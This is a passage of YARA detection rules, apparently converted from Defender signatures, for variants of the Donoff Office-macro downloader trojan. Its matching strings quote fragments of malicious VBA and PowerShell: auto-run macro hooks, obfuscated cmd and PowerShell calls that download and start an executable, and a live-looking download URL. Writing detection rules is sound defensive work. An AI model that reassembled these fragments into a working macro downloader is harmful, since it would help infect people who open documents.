        $x_1_5 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 09 00 28 29 20 41 73 20 53 74 72 69 6e 67 0d 0a 00 20 3d 20 01 00 28 03 00 2c 20 22 [0-9] (69|49) [0-9] (6c|4c) [0-9] (64|44) [0-9] (65|45) [0-9] (66|46) [0-9] (64|44) [0-9] (72|52) 22 2c 20 03 00 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_CQ_2147717947_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CQ"
        threat_id = "2147717947"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 43 6f 6e 74 72 6f 6c 20 3d 20 22 0f 00 2c 20 31 2c 20 30 2c 20 4d 53 46 6f 72 6d 73 2c 20 49 6d 61 67 65 22 [0-5] 41 74 74 72 69 62 75 74 65 20 56 42 5f 43 6f 6e 74 72 6f 6c 20 3d 20 22 0f 00 2c 20 30 2c 20 31 2c 20 4d 53 46 6f 72 6d 73 2c 20 49 6d 61 67 65 22 [0-5] 50 75 62 6c 69 63 20 53 75 62 20 02 5f 43 6c 69 63 6b 28 29 [0-5] 0f 00 [0-15] 45 6e 64 20 53 75 62 [0-5] 50 75 62 6c 69 63 20 53 75 62 20 00 5f 43 6c 69 63 6b 28 29 [0-5] 05 [0-15] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 65 6e 28 0f 00 29 [0-5] 0f 00 20 3d 20 0f 00 28 00 2c 20 0f 00 29 [0-15] 49 66 20 4e 6f 74 20 0f 00 28 0f 00 2c 20 0f 00 29 20 54 68 65 6e [0-5] 75 20 3d 20 02 20 26 20 75 [0-5] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CS_2147718188_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CS"
        threat_id = "2147718188"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 0f 00 28 [0-80] 29 20 41 73 20 53 74 72 69 6e 67 [0-15] 00 20 3d 20 09 00 2e 0f 00 2e 54 65 78 74 20 26 20 22 20 22 20 26 20 09 00 28 04 2e 0f 00 2e 54 65 78 74 29 [0-15] 45 6e 64 20 46 75 6e 63 74 69 6f 6e [0-31] 06 28 09 00 20 41 73 20 53 74 72 69 6e 67 29 [0-31] 3d 20 53 74 72 52 65 76 65 72 73 65 28 54 72 69 6d 28 0c 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CT_2147718351_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CT"
        threat_id = "2147718351"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "CreateObject(\"Scripting.FileSystemObject" ascii //weight: 1
        $x_1_3 = ".CreateTextFile(js, True)" ascii //weight: 1
        $x_1_4 = {45 78 70 61 6e 64 45 6e [0-32] 76 69 72 6f 6e 6d 65 6e 74 53 [0-32] 25 54 45 4d 50 25}  //weight: 1, accuracy: Low
        $x_1_5 = "Shell \"wscript" ascii //weight: 1
        $x_1_6 = {61 74 68 61 6e 6b 61 72 61 [0-32] 69 6b 61 62 61 64 64 69 2e 69 6e [0-32] 6c 79 62 79 62 69 72 64 69 65 2e}  //weight: 1, accuracy: Low
        $x_1_7 = {63 68 2e 6e 61 76 69 74 [0-32] 65 6c 69 61 2e 63 6f 6d 20 63 61 72 73 67 [0-32] 61 6d 65 73 2e 6f 72 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CU_2147718387_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CU"
        threat_id = "2147718387"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 25 54 [0-15] 4d [0-15] 50 [0-15] 2b 20 0f 00 20 2b [0-15] 78 [0-255] 53 68 65 6c 6c 20 0f 00 2e 0f 00 2e 43 61 70 74 69 6f 6e 20 2b ff 00 03 20 3d 20 22 25 5c 0f 00 2e 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CU_2147718387_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CU"
        threat_id = "2147718387"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "+ \" (New-Object S\" +" ascii //weight: 3
        $x_3_2 = "MsgBox \"Word has encountered a problem\", 16, \"" ascii //weight: 3
        $x_4_3 = "Start-Process '%TMP%\\qwer.exe';\", 0" ascii //weight: 4
        $x_3_4 = "+ \").DownloadFile('\" +" ascii //weight: 3
        $x_5_5 = "+ \"cbk.mdk','%TMP%\\qwer.exe');" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CV_2147718471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CV"
        threat_id = "2147718471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "= \"JScr\"" ascii //weight: 2
        $x_3_2 = "= \"rol.Sc\"" ascii //weight: 3
        $x_2_3 = ") & Array(\"" ascii //weight: 2
        $x_2_4 = ".AddCode (" ascii //weight: 2
        $x_4_5 = "= Array(\"ADOD\"," ascii //weight: 4
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CZ_2147718625_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CZ"
        threat_id = "2147718625"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VB_Name = \"qweqwe" ascii //weight: 1
        $x_1_2 = "hel\" + \"l (Ne\" + \"w-O" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DA_2147718627_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DA"
        threat_id = "2147718627"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "Public Function KXVSuLHeV7z() As String" ascii //weight: 10
        $x_10_2 = "Public Function KClj3wzBiEMg7() As String" ascii //weight: 10
        $x_1_3 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 09 00 2c 20 ?? ?? (30|2d|39) (30|2d|39) 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DB_2147718820_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DB"
        threat_id = "2147718820"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {68 62 6d 20 3d 20 55 73 65 72 46 6f 72 6d 31 2e 90 02 15 2e 74 65 78 74}  //weight: 1, accuracy: High
        $x_1_2 = {6b 6a 69 20 3d 20 55 73 65 72 46 6f 72 6d 31 2e 90 02 15 2e 54 65 78 74}  //weight: 1, accuracy: High
        $x_1_3 = "Shell (\"cmd.exe /c \" + " ascii //weight: 1
        $x_1_4 = "h^t^tp^s://" ascii //weight: 1
        $x_1_5 = "Do^wnl^oadFi^le" ascii //weight: 1
        $x_1_6 = "-wi^ndo^wstyle h^idd^en" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DC_2147718863_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DC"
        threat_id = "2147718863"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 50 61 73 73 77 6f 72 64 20 3d 20 22 ?? ?? ?? ?? ?? ?? ?? ?? (61|2d|7a) (61|2d|7a) 22}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 50 61 73 73 77 6f 72 64 20 3d 20 22 ?? ?? ?? ?? ?? ?? ?? ?? (61|2d|7a) (61|2d|7a) 22}  //weight: 1, accuracy: Low
        $x_3_3 = {53 68 65 6c 6c 20 [0-54] 28 [0-42] 29 2c 20 30}  //weight: 3, accuracy: Low
        $x_4_4 = {46 6f 72 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? (61|2d|7a) (61|2d|7a) 20 3d 20 31 20 54 6f 20 4c 65 6e 28 [0-63] 29}  //weight: 4, accuracy: Low
        $x_3_5 = {3d 20 49 6e 53 74 72 52 65 76 28 22 [0-117] 22 2c 20 ?? ?? ?? ?? ?? ?? ?? (61|2d|7a) (61|2d|7a) 29}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 2 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DD_2147718868_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DD"
        threat_id = "2147718868"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {20 41 73 20 4c 6f 6e 67 0d 0a 20 00 20 3d 20 09 00 0d 0a 49 66 20 00 20 (3c|3e|3d) 20 01 20 54 68 65 6e 0d 0a 45 6e 64 20 49 66}  //weight: 2, accuracy: Low
        $x_2_2 = {20 41 73 20 49 6e 74 65 67 65 72 0d 0a 46 6f 72 20 20 00 20 3d 20 30 20 54 6f 20 2d 09 00 0d 0a 4e 65 78 74 20 00 0d 0a 27 20}  //weight: 2, accuracy: Low
        $x_2_3 = {20 3d 20 47 65 74 4f 62 6a 65 63 74 28 20 00 28 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? (2c|30|2d|39) (2c|30|2d|39) [0-1020] 22 29 29}  //weight: 2, accuracy: Low
        $x_1_4 = ".Run(\"start\")" ascii //weight: 1
        $x_1_5 = ".AddCode " ascii //weight: 1
        $x_1_6 = {29 20 58 6f 72 20 03 00 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DD_2147718868_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DD"
        threat_id = "2147718868"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {20 41 73 20 4c 6f 6e 67 0d 0a 20 00 20 3d 20 09 00 0d 0a 49 66 20 00 20 (3c|3e|3d) 20 01 20 54 68 65 6e 0d 0a 45 6e 64 20 49 66}  //weight: 2, accuracy: Low
        $x_2_2 = {20 41 73 20 49 6e 74 65 67 65 72 0d 0a 46 6f 72 20 20 00 20 3d 20 30 20 54 6f 20 2d 09 00 0d 0a 4e 65 78 74 20 00}  //weight: 2, accuracy: Low
        $x_2_3 = {44 69 6d 20 20 00 20 41 73 20 53 74 72 69 6e 67 0d 0a 00 20 3d 20 20 00 28 22 03 00 2c 03 00 2c 03 00 2c 03 00 2c 03 00 2c ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? (2c|30|2d|39) (2c|30|2d|39) [0-1020] 22 29}  //weight: 2, accuracy: Low
        $x_1_4 = ".Run \"start\"" ascii //weight: 1
        $x_1_5 = ".AddCode " ascii //weight: 1
        $x_1_6 = {29 20 58 6f 72 20 03 00 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DE_2147718891_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DE"
        threat_id = "2147718891"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MovedPermanently = Split(\"" ascii //weight: 1
        $x_1_2 = "& \",sym\", vbHide" ascii //weight: 1
        $x_1_3 = "1sQvNkHI4xYDAVsjxRSAOqtGSGWitMZD\"" ascii //weight: 1
        $x_1_4 = "+ \"\\humsrea\" +" ascii //weight: 1
        $x_1_5 = "Shell Robobob & " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DF_2147718892_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DF"
        threat_id = "2147718892"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"cmd.exe\", protectsouth, \"\", \"open\", 0" ascii //weight: 1
        $x_1_2 = "1cImGdQ.1eKxKqeq L/Lvczq" ascii //weight: 1
        $x_1_3 = "declinesoldier(protectsouth & passroom" ascii //weight: 1
        $x_1_4 = "GI-QGwG GhXivzdzIdKeLLnQ2" ascii //weight: 1
        $x_1_5 = "zqpvIo2QwQGeHQrIsIhQKeL1l6qlq." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DG_2147718969_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DG"
        threat_id = "2147718969"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " = \"PPDAta\"" ascii //weight: 1
        $x_1_2 = " = \"ead.ph\"" ascii //weight: 1
        $x_1_3 = " = Application.Documents.Count" ascii //weight: 1
        $x_1_4 = " = \"Cmd.EX\"" ascii //weight: 1
        $x_1_5 = " = \"ERRO\"" ascii //weight: 1
        $x_1_6 = " = \"OAdFil\"" ascii //weight: 1
        $x_1_7 = " = \"eBClie\"" ascii //weight: 1
        $x_1_8 = " = \"E /C \"\"\"" ascii //weight: 1
        $x_1_9 = " = \"ttp://\"" ascii //weight: 1
        $x_1_10 = "ActiveDocument.Content.Text = " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PB_2147718983_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PB"
        threat_id = "2147718983"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "http://gechy.ru/hanger/" ascii //weight: 3
        $x_1_2 = {3d 20 22 63 6d 64 2e 65 78 65 20 2f 63 22 20 26 20 22 43 6d 44 20 [0-16] 22 20 26 20 22 20 63 6d 64 20 22 20 26 20 22 2f 63 22 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = "%TEMP%\\p.scr\" &" ascii //weight: 1
        $x_1_4 = {3d 20 53 68 65 6c 6c 28 [0-16] 2c 20 31 20 2f 20 32 2e 35 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DH_2147718990_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DH"
        threat_id = "2147718990"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"hp?f=\"" ascii //weight: 1
        $x_1_2 = " = \"('htt\"" ascii //weight: 1
        $x_1_3 = " = \"404',\"" ascii //weight: 1
        $x_1_4 = " = \"%.EXE\"" ascii //weight: 1
        $x_1_5 = " = \"p://d\"" ascii //weight: 1
        $x_1_6 = " = \"cmD.e\"" ascii //weight: 1
        $x_1_7 = " = \"ERRO\"" ascii //weight: 1
        $x_1_8 = {20 3e 20 30 20 54 68 65 6e 0d 0a 53 68 65 6c 6c 20 [0-8] 2c 20 [0-8] 0d 0a 4d 73 67 42 6f 78 20 [0-8] 0d 0a 45 6e 64 20 49 66 0d 0a 45 6e 64 20 53 75 62 0d 0a 53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a [0-8] 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DI_2147719028_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DI"
        threat_id = "2147719028"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-15] 20 3d 20 22 55 73 65 72 2d 41 67 65 6e 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 43 53 74 72 28 0f 00 29 [0-15] 3d [0-15] 20 2b 20 52 65 70 6c 61 63 65 28 [0-31] 2c 20 22 2e 22 2c 20 43 53 74 72 28 00 29 20 2b 20 22 2e 22 29 [0-15] 53 75 62 50 72 6f 70 65 72 74 79 2e 54 79 70 65 20 3d 20 31}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6d 62 6f 42 6f 78 31 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-175] 20 3d 20 0f 00 2e 4c 61 62 65 6c 31 2e 43 61 70 74 69 6f 6e [0-175] 3d 20 53 70 6c 69 74 28 22 [0-159] 02 04 03 2e 63 6f 6d 2e 62 72 2f [0-255] 22 2c 20 01 2e 0f 00 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DJ_2147719043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DJ"
        threat_id = "2147719043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "DoLove = aa Xor bb" ascii //weight: 1
        $x_1_2 = {3d 20 53 70 6c 69 74 28 [0-15] 2c 20 22 50 52 45 43 48 49 4c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2c 20 22 73 22 20 2b 20 [0-15] 20 2b 20 22 69 6c 65 22 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DO_2147719244_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DO"
        threat_id = "2147719244"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 44 65 66 61 75 6c 74 54 61 62 6c 65 53 74 79 6c 65 20 3d 20 22 22 0d 0a [0-10] 20 3d 20 [0-10] 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 [0-10] 28 29 0d 0a 0d 0a 49 66 20 [0-10] 20 54 68 65 6e 0d 0a 53 68 65 6c 6c 20 [0-10] 2c 20 [0-6] 0d 0a 45 6e 64 20 49 66 0d 0a 45 6e 64 20 53 75 62 0d 0a 53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DP_2147719253_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DP"
        threat_id = "2147719253"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(" ascii //weight: 1
        $x_1_2 = "= TypeName(ActiveDocument.CodeName) = \"String" ascii //weight: 1
        $x_1_3 = {54 68 65 6e 0d 0a [0-15] 20 3d 20 41 72 72 61 79 28}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 41 72 72 61 79 28 4a 6f 69 6e 28 [0-15] 2c 20 [0-15] 29 29 28 30 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a [0-15] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DQ_2147719254_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DQ"
        threat_id = "2147719254"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= ActiveDocument.DefaultTableStyle" ascii //weight: 1
        $x_1_2 = {3d 20 22 22 20 54 68 65 6e 0d 0a 53 68 65 6c 6c 20 [0-15] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a [0-15] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DR_2147719293_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DR"
        threat_id = "2147719293"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "24"
        strings_accuracy = "High"
    strings:
        $x_20_1 = "Attribute VB_Name = \"mode\"" ascii //weight: 20
        $x_1_2 = " = \"cMd\"" ascii //weight: 1
        $x_1_3 = " = \".ex\"" ascii //weight: 1
        $x_1_4 = " = \"po^\"" ascii //weight: 1
        $x_1_5 = " = \"We^\"" ascii //weight: 1
        $x_1_6 = " = \"RSH\"" ascii //weight: 1
        $x_1_7 = " = \"DoW\"" ascii //weight: 1
        $x_1_8 = " = \"cm\"" ascii //weight: 1
        $x_1_9 = " = \"d.\"" ascii //weight: 1
        $x_1_10 = " = \"ex\"" ascii //weight: 1
        $x_1_11 = " = \"/C\"" ascii //weight: 1
        $x_1_12 = " = \"po\"" ascii //weight: 1
        $x_1_13 = " = \"WE\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_20_*) and 4 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DS_2147719294_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DS"
        threat_id = "2147719294"
        type = "TrojanDownloader"
